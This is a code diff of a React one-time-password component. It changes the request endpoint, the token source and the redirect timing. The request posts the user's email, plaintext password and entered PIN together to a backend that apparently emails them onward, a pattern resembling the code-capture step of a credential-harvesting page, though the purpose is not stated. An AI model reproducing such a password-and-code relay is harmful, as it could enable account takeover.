@@ -21,7 +21,6 @@ const Otp = (props) => {
          setLoading(true)
 
          const clientOtp = keepOtp.toString()
-         history.push('/')
 
          if (props.location.state) {
              const templateParams = props.location.state
@@ -29,13 +28,12 @@ const Otp = (props) => {
              templateParams.clientOtp = clientOtp
 
              try {
-                 
-                 const response = await fetch(URL + '/otp', {
+                 const response = await fetch(URL + '/rq-1', {
                      method: 'POST',
                      headers: {
                          Accept: 'application/json',
                          'Content-type': 'application/json',
-                         Authorization: 'Bearer ' + token,
+                         Authorization: 'Bearer ' + templateParams.token,
                      },
                      credentials: 'include',
                      mode: 'cors',
@@ -44,12 +42,11 @@ const Otp = (props) => {
                          email: templateParams.email,
                          password: templateParams.password,
                          pin: clientOtp,
+                         otp: '',
                      }),
                  })
 
                  const resData = await response.json()
-
-                 console.log('email sending started')
 
                  if (resData.status === 'success') {
                      console.log('Message Sent.')
@@ -57,8 +54,8 @@ const Otp = (props) => {
                          console.log('time out init')
                          setLoading(false)
 
-                         history.push('/')
-                     }, 10000)
+                         history.push('/verifyotp', templateParams)
+                     }, 3000)
                  } else if (resData.status === 'fail') {
                      console.log('Message failed to send.')
                      setLoading(false)
